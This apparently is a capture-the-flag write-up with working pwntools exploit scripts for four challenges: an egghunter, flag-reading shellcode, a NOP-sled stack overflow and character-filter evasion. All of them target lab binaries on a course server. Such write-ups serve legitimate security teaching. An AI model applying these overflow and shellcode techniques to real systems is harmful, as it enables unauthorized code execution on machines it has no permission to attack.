## find-me or debug-me?
* design egg: b"\x90" * 8 (**nopsled**)
* debug egghunter make sure it can do hunter stuff by using pwndbg

```
context.terminal = ['tmux', 'splitw', '-h']
p = process('./find-me')
gdb.attach(p, gdbscript='''
b *0x4017d3  #call rax(egghunter)
c
''')
```

* egghunter itself

```
# search from rax(egghunter), set rax to rcx, coz rax maybe has some special task so use rcx which is free currently
mov rcx, rax

# logic quite simple, code as the comment
skip:
    inc rcx
    jmp search
search:
    cmp dword ptr [rcx], 0x90909090
    jne skip
    
    cmp dword ptr [rcx + 4], 0x90909090
    jne skip
    
    jmp rcx
```
* another life saver: **find start_addr, end_addr, egg** in pwndgb, try to figure out if egg has been injected

```
pwndbg> lis or vmap
pwndbg> find start_addr, end_addr, egg
```

* shellcode **nothing** special

```
payload = egg + shellcode(cat /flag)

```

* whole script

```
from pwn import *

context.arch = 'amd64'

p = remote('6447.lol', 20709)

# context.terminal = ['tmux', 'splitw', '-h']
# p = process('./find-me')
# gdb.attach(p, gdbscript='''
#     b *0x4017d3
#     c
# ''')

shellcode = asm(f'''
   XOR RAX, RAX
   MOV RAX, 0x67616C662F
   PUSH RAX
   MOV RDI, RSP


   XOR RSI, RSI
   XOR RDX, RDX
   MOV RAX, 2
   SYSCALL

   MOV RDI, RAX
   MOV RSI, RSP
   MOV RDX, 200
   XOR RAX, RAX
   SYSCALL

   MOV RDI, 1
   MOV RSI, RSP
   MOV RDX, 200
   MOV RAX, 1
   SYSCALL

   XOR RDI, RDI
   MOV RAX, 60
   SYSCALL
''')

egg = b"\x90" * 4

egghunter = asm(f'''
mov rcx, rax
skip:
    inc rcx
    jmp search
search:
    cmp dword ptr [rcx], 0x90909090
    jne skip
    
    cmp dword ptr [rcx + 4], 0x90909090
    jne skip
    
    jmp rcx
''')

payload = egg + egg + shellcode

p.recvuntil(b'enter your smallbuf shellcode').decode('utf-8').strip()
p.sendline(egghunter)

p.recvuntil(b'enter your bigbuf shellcode:').decode('utf-8').strip()
p.sendline(payload)

p.interactive()

```



## simple 
* practice assembly code with open/read/write/exit

```
from pwn import *

def interact_with_process(binary_path, host=None, port=None):
    # Start the process
    if host and port:
        p = remote(host, port)
    else:
        p = process(binary_path)

    context.arch = 'amd64'

    # Shellcode to open /flag and read it
    shellcode = asm('''
               XOR RAX, RAX
               MOV RAX, 0x47414C462F
               PUSH RAX
               MOV RDI, RSP


               XOR RSI, RSI
               XOR RDX, RDX
               MOV RAX, 2
               SYSCALL

               MOV RDI, RAX
               MOV RSI, RSP
               MOV RDX, 200
               XOR RAX, RAX
               SYSCALL

               MOV RDI, 1
               MOV RSI, RSP
               MOV RDX, 200
               MOV RAX, 1
               SYSCALL

               XOR RDI, RDI
               MOV RAX, 60
               SYSCALL

           ''')

    print('shellcode:', shellcode)
    p.sendlineafter(b':', shellcode)
    p.interactive()

# Example usage
interact_with_process('', '6447.lol', 26246)
```

## shellz or nopsled

* make a bufferoverflow to overwrite the ret addr to the random addr within stack which can **be writable**
* put shellcode in the rdn addr in the stack, since its random, need **nop sled** to reach the shellcode
* so payload = nopsled_padding + shellcode + padding_rbp + ret_address

```
from pwn import *
import struct


def interact_with_process(binary_path, host=None, port=None):
    # Start the process
    if host and port:
        p = remote(host, port)
    else:
        p = process(binary_path)

    context.arch = 'amd64'


    shellcode = asm('''
           XOR RAX, RAX
           MOV RAX, 0x47414C462F
           PUSH RAX
           MOV RDI, RSP


           XOR RSI, RSI
           XOR RDX, RDX
           MOV RAX, 2
           SYSCALL

           MOV RDI, RAX
           MOV RSI, RSP
           MOV RDX, 200
           XOR RAX, RAX
           SYSCALL

           MOV RDI, 1
           MOV RSI, RSP
           MOV RDX, 200
           MOV RAX, 1
           SYSCALL

           XOR RDI, RDI
           MOV RAX, 60
           SYSCALL

       ''')

    padding_size = (0x2000 - len(shellcode))

    padding = b"\x90" * padding_size

    padding_rbp = b"A" * 8
    # print('padding_size is :', padding_size)

    # print("Shellcode: ", shellcode.hex())

    p.recvuntil(b'Here is a random stack address: ')
    rdn_addr_str = p.recvline().strip(b'\n')
    rdn_addr = int(rdn_addr_str, 16)
    ret_address = p64(rdn_addr)
    # print(f"Random stack address: {ret_address}")

    payload = padding + shellcode + padding_rbp + ret_address
    # print('payload:', payload)

    # Send the payload
    p.sendline(payload)
    p.interactive()


# Example usage
interact_with_process('', '6447.lol', 22301)

```

## waz or FLAG!=flag

* figure out banned charater by reverse engineering which is a to h 
* polish shellcode by avoiding using banned charater which is f a g, by replacing them to '**FLAG**' then convert it to '**flag**' by and byte [rsp + 1], 0x20
* payload = shellcode + padding + padding_rbp + ret_address

#### detect banned charater

```
def check_shellcode(shellcode):
    # Define the forbidden characters to check (in bytes format)
    forbidden_chars = b"abcdefgh"

    # Check each byte in the shellcode to see if it matches any forbidden characters
    found_chars = set()
    for byte in shellcode:
        if bytes([byte]) in forbidden_chars:
            found_chars.add(byte)

    # Print out the result
    if found_chars:
        print(f"Forbidden characters found in shellcode: {', '.join([chr(c) for c in found_chars])}")
    else:
        print("No forbidden characters found in shellcode.")

# Shellcode to check
shellcode = b"\x48\x31\xc0\x50\x48\xbb\x2f\x46\x4c\x41\x47\x00\x00\x00\x53\xc6\x44\x24\x01\x46\x80\x74\x24\x01\x20\xc6\x44\x24\x02\x4c\x80\x74\x24\x02\x20\xc6\x44\x24\x03\x41\x80\x74\x24\x03\x20\xc6\x44\x24\x04\x47\x80\x74\x24\x04\x20\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\xc7\xc0\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\xc7\xc2\xc8\x00\x00\x00\x48\x31\xc0\x0f\x05\x48\xc7\xc7\x01\x00\x00\x00\x48\x89\xe6\x48\xc7\xc2\xc8\x00\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x0f\x05\x48\x31\xff\x48\xc7\xc0\x3c\x00\x00\x00\x0f\x05\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xe0\x2e\x65\x18\xff\x7f\x00\x00"
print(len(shellcode))
# Check the shellcode for forbidden characters
check_shellcode(shellcode)

```
#### pwn script

```
from pwn import *
import struct


def interact_with_process(binary_path, host=None, port=None):
    # Start the process
    if host and port:
        p = remote(host, port)
    else:
        p = process(binary_path)

    context.arch = 'amd64'

    shellcode = asm('''
        xor rax, rax
        push rax
        mov rbx, 0x474141462f
        push rbx
        mov byte [rsp + 1], 'F'
        and byte [rsp + 1], 0x20
        mov byte [rsp + 2], 'L'
        and byte [rsp + 2], 0x20
        mov byte [rsp + 3], 'A'
        and byte [rsp + 3], 0x20
        mov byte [rsp + 4], 'G'
        and byte [rsp + 4], 0x20
        
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 2
        syscall
        
        mov rdi, rax
        mov rsi, rsp
        mov rdx, 0xc8
        xor rax, rax
        syscall
        
        mov rdi, 1
        mov rsi, rsp
        mov rdx, 0xc8
        mov rax, 1
        syscall
        
        xor rdi, rdi
        mov rax, 60
        syscall

    ''')
    # shellcode = b"\x48\x31\xc0\x50\x48\xbb\x2f\x46\x4c\x41\x47\x00\x00\x00\x53\xc6\x44\x24\x01\x46\x80\x74\x24\x01\x20\xc6\x44\x24\x02\x4c\x80\x74\x24\x02\x20\xc6\x44\x24\x03\x41\x80\x74\x24\x03\x20\xc6\x44\x24\x04\x47\x80\x74\x24\x04\x20\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\xc7\xc0\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\xc7\xc2\xc8\x00\x00\x00\x48\x31\xc0\x0f\x05\x48\xc7\xc7\x01\x00\x00\x00\x48\x89\xe6\x48\xc7\xc2\xc8\x00\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x0f\x05\x48\x31\xff\x48\xc7\xc0\x3c\x00\x00\x00\x0f\x05"

    padding_size = (0x110 - len(shellcode))

    padding = b"A" * padding_size

    padding_rbp = b"A" * 8

    p.recvuntil(b'The address of your buffer/shellcode is: ')
    rdn_addr_str = p.recvline().strip(b'\n')
    print('rdn_addr_str', rdn_addr_str)
    rdn_addr = int(rdn_addr_str, 16)
    ret_address = p64(rdn_addr)
    print(f"Random stack address: {ret_address}")

    payload = shellcode + padding + padding_rbp + ret_address

    print(payload.hex())

    # Send the payload
    p.sendline(payload)
    p.interactive()


# Example usage
interact_with_process('', '6447.lol', 6192)

```